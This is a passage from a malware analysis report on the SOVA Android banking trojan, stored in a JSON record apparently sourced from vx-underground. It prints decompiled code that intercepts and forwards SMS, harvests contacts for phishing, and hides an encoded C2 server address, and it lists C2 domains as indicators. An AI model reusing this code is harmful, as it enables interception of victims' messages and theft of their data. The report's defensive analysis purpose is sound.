message.\n public void onReceive(Context context0, Intent intent0) {\n\n    try {\n\n      SmsMessage[] arr_smsMessage =\nTelephony.Sms.Intents.getMessagesFromIntent(intent0);\n\n      Intrinsics.checkNotNullExpressionValue(arr_smsMessage, \"smsMessages\");\n\n      int v = 0;\n\n      while(true) {\n\n        if(v >= arr_smsMessage.length) {\n\n          return;\n\n        }\n\n        SmsMessage smsMessage0 = arr_smsMessage[v];\n\n        ++v;\n\n        Intrinsics.checkNotNullExpressionValue(Uri.parse(\"content://sms\"),\n\"parse(\\\"content://sms\\\")\");\n\n        String s = smsMessage0.getMessageBody();\n\n        Intrinsics.checkNotNullExpressionValue(s, \"message.messageBody\");\n\n        String s1 = smsMessage0.getOriginatingAddress();\n\n        Intrinsics.checkNotNull(s1);\n\n        Intrinsics.checkNotNullExpressionValue(s1,\n\"message.originatingAddress!!\");\n\n        new SendSms(s, s1).justExecute();\n\n        StringBuilder stringBuilder0 = new StringBuilder().append(\"Sending\nSMS Message (\");\n\n        String s2 = smsMessage0.getOriginatingAddress();\n\n        Intrinsics.checkNotNull(s2);\n\n        AppKt.log$default(this, stringBuilder0.append(s2).append(\",\n\").append(smsMessage0.getMessageBody()).append(')').toString(), null, null, 6, null);\n\n        this.abortBroadcast();\n\n      }\n\n    }\n\n    catch(Exception unused_ex) {\n\n      return;\n\n    }\n\n  }\n\n}\n\n\n```\n\n-----\n\n#### The malware will start collecting contacts to gain new victims by sending phishing SMS.\n```\nif(Intrinsics.areEqual(s, \"contactssender\")) {\n\n            HashMap hashMap0 = Contacts.getContactList(context0);\n\n            for(Object object0: hashMap0.keySet()) {\n\n              String s1 = (String)object0;\n\n              try {\n\n                Object object1 = hashMap0.get(s1);\n\n                Intrinsics.checkNotNull(object1);\n\n                Intrinsics.checkNotNullExpressionValue(object1,\n\"contacts[i]!!\");\n\nContexStartExtensionsKt.sendSMS(((Context)workerService1), ((String)object1),\ncommand0.getText());\n\n              }\n\n              catch(Exception unused_ex) {\n\n                return;\n\n              }\n\n            }\n\n          }\n\nif(Intrinsics.areEqual(s, \"getcontacts\")) {\n\n                ContextAccessesExtensionsKt.sendImAlive(context0,\npreferences0, workerService0.getLogger());\n\n                return;\n\n The malware creates a loop to collect the contacts by collecting the id, display_name, and number then save this info to data1 to upload this file to C2 server.\n\n```\n\n-----\n\n```\npublic class Contacts {\n\n  public static HashMap getContactList(Context context0) {\n\n    ContentResolver contentResolver0 = context0.getContentResolver();\n\n    Cursor cursor0 =\ncontentResolver0.query(ContactsContract.Contacts.CONTENT_URI, null, null, null,\nnull);\n\n    HashMap hashMap0 = new HashMap();\n\n    if((cursor0 == null ? 0 : cursor0.getCount()) > 0) {\n\n      while(cursor0.moveToNext()) {\n\n        String s = cursor0.getString(cursor0.getColumnIndex(\"_id\"));\n\n        String s1 =\ncursor0.getString(cursor0.getColumnIndex(\"display_name\"));\n\n        if(cursor0.getInt(cursor0.getColumnIndex(\"has_phone_number\")) <= 0) {\n\n          continue;\n\n        }\n\n        Cursor cursor1 =\ncontentResolver0.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,\n\"contact_id = ?\", new String[]{s}, null);\n\n        while(cursor1.moveToNext()) {\n\n          hashMap0.put(s1,\ncursor1.getString(cursor1.getColumnIndex(\"data1\")));\n\n        }\n\n        cursor1.close();\n\n      }\n\n    }\n\n    if(cursor0 != null) {\n\n      cursor0.close();\n\n    }\n\n    return hashMap0;\n\n  }\n\n#### The malware connects to http://ip-api.com to retrive the IP, location of the victim. If the IP is located in listCountryToIgnore, the malware will ignore the victim’s device and don’t performe the malicious functions.\nstatic {\n\nIntrinsics.checkNotNullExpressionValue(\"aHR0cDovL3NhdGFuZGVtYW50ZW5pbWllbnRvLmNvbQ==\",\n \"TDE(\\\"aHR0cDovL3NhdGFuZGV…W50ZW5pbWllbnRvLmNvbQ==\\\")\");\n\n    ConstKt.SERVER_ADDRESS = \"aHR0cDovL3NhdGFuZGVtYW50ZW5pbWllbnRvLmNvbQ==\";\n\n    Intrinsics.checkNotNullExpressionValue(\"MQ==\", \"TDE(\\\"MQ==\\\")\");\n\n    ConstKt.ACCESS_VALUE = \"MQ==\";\n\n    ConstKt.listCountryToIgnore = CollectionsKt.listOf(new String[]{\"AZ\", \"AM\",\n\"BY\", \"KZ\", \"KG\", \"MD\", \"RU\", \"TJ\", \"UZ\", \"UA\", \"ID\"});\n\n  }\n\n\n```\n\n-----\n\n#### We come to the end. There are some other commands such as delbot to delete the bot from victim’s device, starthidenpush to hide pushing notification, delapp to delete apps from the device, call to call action from the device, callforward to forward a phone call to the attacker and more commands found in this malware.\n\n## Dynamic\n\n#### After installing the malicious APK and open the APK, the malware will keep asking you for granting the Accessibility Service to maintain presistance. After granting, the malware will be able to get the permission by itself as if he makes himself home.\n\n Figure(9): connects to ip-api to get country and IP and more\n\n\n-----\n\n#### Figure(10): connects to C2 server with param and botid, response from C2 is `ok`\n\n## IoC\n\n#### No. Description Hash and URLs\n\n 1 APK (MD5 ) 74b8956dc35fd8a5eb2f7a5d313e60ca\n\n 2 The unpacked dex (MD5) f7f7cdf82b7b6c72882a6172213d0aff\n\n 3 C2 server http://satandemantenimiento.com\n\n 4 C2 server http://wecrvtbyutrcewwretyntrverfd.xyz\n\n## Article quote\n\n#### في ُمهِلكاِت الُّدروبأتهُجُر درَب الُهَدى والَّص الِح وترَحُ[ل]\n\n## REF\n\n#### SOVA malware is back and is evolving rapidly\n\n Android Dev\n\n Unpacking process\n\n [Mal Series #20] Android libarm_protect packer\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-01 - Technical analysis of SOVA android malware.pdf"
    ],
    "report_names": [
        "2022-09-01 - Technical analysis of SOVA android malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536096,
    "ts_updated_at": 1743041166,
    "ts_creation_date": 1662984015,
    "ts_modification_date": 1662984015,
    "files": {
        "pdf": "https://archive.orkl.eu/3342aa1de42918824ea07c55fe5fd92e34fea2a5.pdf",
        "text": "https://archive.orkl.eu/3342aa1de42918824ea07c55fe5fd92e34fea2a5.txt",
        "img": "https://archive.orkl.eu/3342aa1de42918824ea07c55fe5fd92e34fea2a5.jpg"
    }
}